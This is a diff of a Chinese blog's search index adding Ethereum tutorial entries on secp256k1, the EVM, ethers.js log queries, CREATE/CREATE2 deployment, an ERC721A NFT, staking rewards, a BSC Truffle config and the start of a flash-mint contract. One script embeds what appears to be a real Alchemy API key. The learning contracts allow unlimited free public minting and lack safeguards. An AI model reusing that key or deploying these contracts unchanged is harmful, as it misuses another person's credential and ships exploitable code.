@@ -324,6 +324,41 @@ Redux与React没有关系，Redux支持react , angular jquery
       </tags>
   </entry>
   <entry>
+    <title>1-3Vuejs2Vue3</title>
+    <url>/2022/07/04/1-3Vuejs2Vue3/</url>
+    <content><![CDATA[<h1 id="002-Vue引入"><a href="#002-Vue引入" class="headerlink" title="002 Vue引入"></a>002 Vue引入</h1>]]></content>
+      <tags>
+        <tag>Node</tag>
+        <tag>Vuejs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2-1ETH_Crypto</title>
+    <url>/2021/05/03/2-1ETH-Crypto/</url>
+    <content><![CDATA[<h1 id="数据签名算法"><a href="#数据签名算法" class="headerlink" title="数据签名算法"></a>数据签名算法</h1><h2 id="ECDSA数字签名算法"><a href="#ECDSA数字签名算法" class="headerlink" title="ECDSA数字签名算法"></a>ECDSA数字签名算法</h2><ul>
+<li>椭圆曲线签名算法。</li>
+</ul>
+<h2 id="secp256k1签名算法"><a href="#secp256k1签名算法" class="headerlink" title="secp256k1签名算法"></a>secp256k1签名算法</h2><p>高效密码组标准（SECG）协会开发，比特币使用了此算法，从此secp256k1开始流行。</p>
+<p>sec 标识来自SECG标准<br>p 标识曲线坐标的素数域<br>256表示素数是256位长<br>k表示koblitz曲线变体<br>1表示第一个标准的此类型曲线</p>
+<ul>
+<li>优点 <ul>
+<li>1.占用很少的宽带和</li>
+<li>2.存储资源，密钥长度很短。</li>
+<li>3.让所有的用户都可以使用同样的操作完成域运算。</li>
+<li>4.由于其特殊构造的特殊性，其优化后实现比其他曲线性能上可以提高30%</li>
+</ul>
+</li>
+</ul>
+<h2 id="为什么比特币选择secp256k1签名算法而不是其他已流行的算法？"><a href="#为什么比特币选择secp256k1签名算法而不是其他已流行的算法？" class="headerlink" title="为什么比特币选择secp256k1签名算法而不是其他已流行的算法？"></a>为什么比特币选择secp256k1签名算法而不是其他已流行的算法？</h2><p>安全： 不受任何政府控制，没有后门的签名算法。<br>高效：可预测性，高效。</p>
+<h2 id="以太坊的签名算法是-secp256k1"><a href="#以太坊的签名算法是-secp256k1" class="headerlink" title="以太坊的签名算法是 secp256k1"></a>以太坊的签名算法是 secp256k1</h2><h1 id="了解椭圆曲线理论基础。"><a href="#了解椭圆曲线理论基础。" class="headerlink" title="了解椭圆曲线理论基础。"></a>了解椭圆曲线理论基础。</h1><h2 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h2><ul>
+<li>就是一个二元三次方程上的所有的点的集合。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1-2Nextjs-React</title>
     <url>/2022/06/18/1-2Nextjs-React/</url>
     <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install react react-dom next</span><br></pre></td></tr></table></figure>
@@ -336,12 +371,254 @@ Redux与React没有关系，Redux支持react , angular jquery
       </tags>
   </entry>
   <entry>
-    <title>1-3Vuejs2Vue3</title>
-    <url>/2022/07/04/1-3Vuejs2Vue3/</url>
-    <content><![CDATA[<h1 id="002-Vue引入"><a href="#002-Vue引入" class="headerlink" title="002 Vue引入"></a>002 Vue引入</h1>]]></content>
+    <title>2-3ETH_EVM</title>
+    <url>/2022/06/25/2-3ETH-EVM/</url>
+    <content><![CDATA[<h1 id="EVM"><a href="#EVM" class="headerlink" title="EVM"></a>EVM</h1><p><img src="/images/web3/evm1.png" alt="image"></p>
+<p><a class="link"   href="https://www.evm.codes/" >evm.codes<i class="fas fa-external-link-alt"></i></a>  </p>
+<p>汇编操作花费的gas费 </p>
+<p>智能合约编译出xx.json<br>里面有object，opcodes<br>60 push1</p>
+<p>608060<br>6000f3fe</p>
+<p><img src="/images/web3/evm2.png" alt="image"></p>
+<p>PUSH1 0X80<br>PUSH1 0X40<br>MSTORE </p>
+<p>初始化内存</p>
+<h1 id="Ethers如何获取链上数据"><a href="#Ethers如何获取链上数据" class="headerlink" title="Ethers如何获取链上数据?"></a>Ethers如何获取链上数据?</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g typescript</span><br><span class="line"></span><br><span class="line">npm install -g ts-node</span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   href="https://emn178.github.io/online-tools/keccak_256.html" >https://emn178.github.io/online-tools/keccak_256.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/images/web3/keccak1.png" alt="images"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;ethers&#125; from &#x27;ethers&#x27;</span><br><span class="line"></span><br><span class="line">async function main()&#123;</span><br><span class="line">   const provider = new ethers.providers.WebSocketProvider(&quot;wss://eth-rinkeby.alchemyapi.io/v2/wlSefEw7ZYKLXkmSNDM82KQRWxyI9pPV&quot;)</span><br><span class="line">   </span><br><span class="line">   provider.on(&quot;block&quot;,async(block)=&gt;&#123;</span><br><span class="line">  </span><br><span class="line">    // 获取一个合约的</span><br><span class="line">    let contractAddress = &quot;0x1526651967fec009D5E61385D65bA30B88631422&quot;</span><br><span class="line"></span><br><span class="line">    let topic  =ethers.utils.id(&quot;IdoInvitation(address,address)&quot;)</span><br><span class="line">    console.log(topic)</span><br><span class="line">    </span><br><span class="line">    let filter=&#123;</span><br><span class="line">        fromBlock:10919300,</span><br><span class="line">        address : contractAddress,</span><br><span class="line">        topics : [topic]</span><br><span class="line">    &#125;</span><br><span class="line">    //0xfc9790fbc3d9f4784441e9793c41a7ed13f83b0486c728dcc9ca344db464bb30</span><br><span class="line">    provider.getLogs(filter).then(result=&gt;&#123;</span><br><span class="line">      console.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 主动拉取数据 </span><br><span class="line">    // latest 最新的区块</span><br><span class="line">    // ealiest 最早的区块</span><br><span class="line">    // pending 正在打包的区块</span><br><span class="line">    // 往后数10个区块</span><br><span class="line">    // 10888844</span><br><span class="line">    // provider.getBlock(-10).then(result=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 监听 </span><br><span class="line">    // provider.on(filter,async(result)=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // let filter = &#123;</span><br><span class="line">    //     address : contractAddress</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    // 监听事件</span><br><span class="line">    // provider.on(filter,async(result)=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">       // 获取区块编号</span><br><span class="line">    //    console.log(block)</span><br><span class="line">    // 获取block内容</span><br><span class="line">    // const blockInfo = await provider.getBlock(block);</span><br><span class="line">    /*</span><br><span class="line">      hash: &#x27;0x041099c0e022d42bd3720a07f9d917220f962b0130ba7dab08209f62228936b9&#x27;,</span><br><span class="line">  parentHash: &#x27;0x8de446faab4cf3c747a7f724005749d80cb7ceacd56dc78ae407d92740ebeb9f&#x27;,</span><br><span class="line">    */</span><br><span class="line">    // console.log(blockInfo)</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">    // 获取block内容以及交易数据 </span><br><span class="line"></span><br><span class="line">    // const blockWithTransactions =await provider.getBlockWithTransactions(block)</span><br><span class="line">    // console.log(blockWithTransactions)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &#125;)</span><br><span class="line"></span><br><span class="line">//    provider.on(&quot;pending&quot;,async(tx)=&gt;&#123;</span><br><span class="line">//        console.log(tx)</span><br><span class="line">//       // 交易</span><br><span class="line">//        const txDetail  = await provider.getTransaction(tx);</span><br><span class="line">//        console.log(txDetail);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">//    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
       <tags>
-        <tag>Node</tag>
-        <tag>Vuejs</tag>
+        <tag>ETH</tag>
+        <tag>EVM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2-4ETH_THINKINGCHAIN</title>
+    <url>/2021/06/29/2-4ETH-THINKINGCHAIN/</url>
+    <content><![CDATA[<h1 id="Solidity部署合约的两种方式CREATE与CREATE2"><a href="#Solidity部署合约的两种方式CREATE与CREATE2" class="headerlink" title="Solidity部署合约的两种方式CREATE与CREATE2"></a>Solidity部署合约的两种方式CREATE与CREATE2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy() public&#123;</span><br><span class="line">        token =new Token();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>create</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy() public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        bytes memory byteCode= type(Token).creationCode;</span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            // 得到32位偏移量 然后放到堆栈</span><br><span class="line">            addr := create(0,add(byteCode,32),mload(byteCode))</span><br><span class="line">            if iszero(extcodesize(addr))&#123;</span><br><span class="line">                revert(0,0)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        token =Token(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>salt</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy(string calldata _salt ) public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        //在0.6.0后可以用  底层是create2是实现方式</span><br><span class="line">        bytes32 saltBytes= keccak256(bytes(_salt));</span><br><span class="line">        token =new Token&#123;salt:saltBytes&#125;();</span><br><span class="line">        </span><br><span class="line">        return address(token);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>create2</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy(string calldata _salt ) public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        //在0.6.0后可以用  底层是create2是实现方式</span><br><span class="line">        bytes memory byteCode= type(Token).creationCode;</span><br><span class="line">        bytes32 saltBytes= keccak256(bytes(_salt));</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            // 得到32位偏移量 然后放到堆栈</span><br><span class="line">            addr := create2(0,add(byteCode,32),mload(byteCode),saltBytes)</span><br><span class="line">            if iszero(extcodesize(addr))&#123;</span><br><span class="line">                revert(0,0)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        token =Token(addr);</span><br><span class="line">        </span><br><span class="line">         return address(token);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="ERC721A-介绍"><a href="#ERC721A-介绍" class="headerlink" title="ERC721A 介绍"></a>ERC721A 介绍</h1><p><a class="link"   href="https://www.azuki.com/erc721a" >https://www.azuki.com/erc721a<i class="fas fa-external-link-alt"></i></a></p>
+<p>ERC721A更省气，而且可以批量挖币</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/chiru-labs/ERC721A/blob/main/contracts/ERC721A.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ThinkingChain is ERC721A, Ownable  &#123;</span><br><span class="line"></span><br><span class="line">    string private constant SUFFIX_URI = &quot;.json&quot;;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721A(&quot;ThinkingChain&quot;, &quot;TKGC&quot;) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(uint256 quantity) external payable &#123;</span><br><span class="line">        _mint(msg.sender, quantity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeMint(address to,uint256 quantity) public onlyOwner &#123;</span><br><span class="line">         _mint(to, quantity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _baseURI() internal pure override returns (string memory) &#123;</span><br><span class="line">        return &quot;https://thinkingchain.app/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256 tokenId) public view override returns (string memory) &#123;</span><br><span class="line">        string memory baseTokenIdUri = super.tokenURI(tokenId);</span><br><span class="line">        return string(abi.encodePacked(baseTokenIdUri,SUFFIX_URI));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="质押挖矿"><a href="#质押挖矿" class="headerlink" title="质押挖矿"></a>质押挖矿</h1><h2 id="质押A代币，收益A、B或其他ERC20代币"><a href="#质押A代币，收益A、B或其他ERC20代币" class="headerlink" title="质押A代币，收益A、B或其他ERC20代币"></a>质押A代币，收益A、B或其他ERC20代币</h2><p><img src="/images/web3/shou1.png" alt="images"></p>
+<p><img src="/images/web3/shou2.png" alt="images"></p>
+<p><img src="/images/web3/shou3.png" alt="images"></p>
+<p><img src="/images/web3/shou4.png" alt="images"></p>
+<p><img src="/images/web3/shou5.png" alt="images"></p>
+<p><img src="/images/web3/shou6.png" alt="images"><br><img src="/images/web3/shou7.png" alt="images"></p>
+<ul>
+<li>StakingToken.sol</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingToken is ERC20, ERC20Burnable, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;StakingToken&quot;, &quot;SWK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 10000);</span><br><span class="line">		_mint(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, 10000);</span><br><span class="line">		_mint(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, 10000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>RewardsToken.sol</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewardsToken is ERC20, ERC20Burnable, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;RewardsToken&quot;, &quot;RWK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10 ** decimals());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>StakingRewards.sol</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingRewards &#123;</span><br><span class="line">    IERC20 public rewardsToken;</span><br><span class="line">    IERC20 public stakingToken;</span><br><span class="line"></span><br><span class="line">    uint public rewardRate = 100;</span><br><span class="line">    uint public lastUpdateTime;</span><br><span class="line">    uint public rewardPerTokenStored;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public userRewardPerTokenPaid;</span><br><span class="line">    mapping(address =&gt; uint) public rewards;</span><br><span class="line"></span><br><span class="line">    uint private _totalSupply;</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line"></span><br><span class="line">    constructor(address _stakingToken, address _rewardsToken) &#123;</span><br><span class="line">        stakingToken = IERC20(_stakingToken);</span><br><span class="line">        rewardsToken = IERC20(_rewardsToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // S=∑_t=0^tb▒R/L(t) </span><br><span class="line">    function rewardPerToken() public view returns (uint) &#123;</span><br><span class="line">        if (_totalSupply == 0) &#123;</span><br><span class="line">            return rewardPerTokenStored;</span><br><span class="line">        &#125;</span><br><span class="line">        // s+=(Tb-Ta)*R/100</span><br><span class="line">        return</span><br><span class="line">            rewardPerTokenStored +</span><br><span class="line">            (((block.timestamp - lastUpdateTime) * rewardRate ) / _totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // r(u, ta, tb) = l(S − P)</span><br><span class="line">    // l = _balances[account]</span><br><span class="line">    // s = rewardPerToken() =  s+=(Tb-Ta)*R/100</span><br><span class="line">    // p = userRewardPerTokenPaid[account])</span><br><span class="line">    // rewards[account] 加上之前未体现的收益</span><br><span class="line">    function earned(address account) public view returns (uint) &#123;</span><br><span class="line">        return</span><br><span class="line">            ((_balances[account] * </span><br><span class="line">             (rewardPerToken() - userRewardPerTokenPaid[account])))  </span><br><span class="line">             +  rewards[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier updateReward(address account) &#123;</span><br><span class="line">        rewardPerTokenStored = rewardPerToken();</span><br><span class="line">        console.log(&quot;pre user amount:&quot;,_balances[account]);</span><br><span class="line">        console.log(&quot;pre L(t):&quot;,_totalSupply);</span><br><span class="line">        console.log(&quot;S:&quot;,rewardPerTokenStored);</span><br><span class="line">        lastUpdateTime = block.timestamp;</span><br><span class="line">        console.log(&quot;pre P:&quot;,userRewardPerTokenPaid[account]);</span><br><span class="line">        rewards[account] = earned(account);</span><br><span class="line">        userRewardPerTokenPaid[account] = rewardPerTokenStored;</span><br><span class="line">        console.log(&quot;currrent P:&quot;,userRewardPerTokenPaid[account]);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stake(uint _amount) external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;stake action&quot;);</span><br><span class="line">        _totalSupply += _amount;</span><br><span class="line">        _balances[msg.sender] += _amount;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        stakingToken.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;withdraw action&quot;);</span><br><span class="line">        _totalSupply -= _amount;</span><br><span class="line">        _balances[msg.sender] -= _amount;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        stakingToken.transfer(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReward() external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;getReward action&quot;);</span><br><span class="line">        uint reward = rewards[msg.sender];</span><br><span class="line">        rewards[msg.sender] = 0;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        rewardsToken.transfer(msg.sender, reward);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="BSC网络"><a href="#BSC网络" class="headerlink" title="BSC网络"></a>BSC网络</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;dotenv&#x27;).config();</span><br><span class="line">const privateKeys = process.env.PRIVATE_KEYS || &quot;&quot;</span><br><span class="line">const HDWalletProvider = require(&#x27;@truffle/hdwallet-provider&#x27;);</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  networks: &#123;</span><br><span class="line">    bsc_testnet: &#123;</span><br><span class="line">      provider: () =&gt; new HDWalletProvider(</span><br><span class="line">        privateKeys.split(&#x27;,&#x27;),</span><br><span class="line">        `https://data-seed-prebsc-1-s1.binance.org:8545`</span><br><span class="line">      ),</span><br><span class="line">      network_id: 97,</span><br><span class="line">      confirmations: 10,</span><br><span class="line">      timeoutBlocks: 200,</span><br><span class="line">      skipDryRun: true</span><br><span class="line">    &#125;,</span><br><span class="line">    bsc_mainnet: &#123;</span><br><span class="line">      provider: () =&gt; new HDWalletProvider(</span><br><span class="line">        privateKeys.split(&#x27;,&#x27;),</span><br><span class="line">        `https://bsc-dataseed1.binance.org`</span><br><span class="line">      ),</span><br><span class="line">      network_id: 56,</span><br><span class="line">      confirmations: 10,</span><br><span class="line">      timeoutBlocks: 200,</span><br><span class="line">      skipDryRun: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  compilers: &#123;</span><br><span class="line">    solc: &#123;</span><br><span class="line">      version: &quot;&gt;=0.6.0 &lt;0.8.0&quot;,</span><br><span class="line">      optimizer: &#123;</span><br><span class="line">        enabled: true,</span><br><span class="line">        runs: 200</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a class="link"   href="https://testnet.binance.org/faucet-smart" >https://testnet.binance.org/faucet-smart<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://testnet.bscscan.com/" >https://testnet.bscscan.com<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="Openzeppelin系列-闪电贷-Flash-Minting"><a href="#Openzeppelin系列-闪电贷-Flash-Minting" class="headerlink" title="Openzeppelin系列| 闪电贷 Flash Minting"></a>Openzeppelin系列| 闪电贷 Flash Minting</h1><p>设置放贷<br><img src="/images/web3/fl1.png" alt="images"></p>
+<p><img src="/images/web3/fl2.png" alt="images"></p>
+<p><img src="/images/web3/fl3.png" alt="images"></p>
+<p><img src="/images/web3/fl4.png" alt="images"></p>
+<p>合约代码Flashloan.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20FlashMint.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Lender is ERC20, Ownable ,ERC20FlashMint &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 private constant _RETURN_VALUE = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    constructor() ERC20(&quot;Lender&quot;, &quot;LND&quot;) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        IERC3156FlashBorrower borrower,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) public virtual override returns (bool) 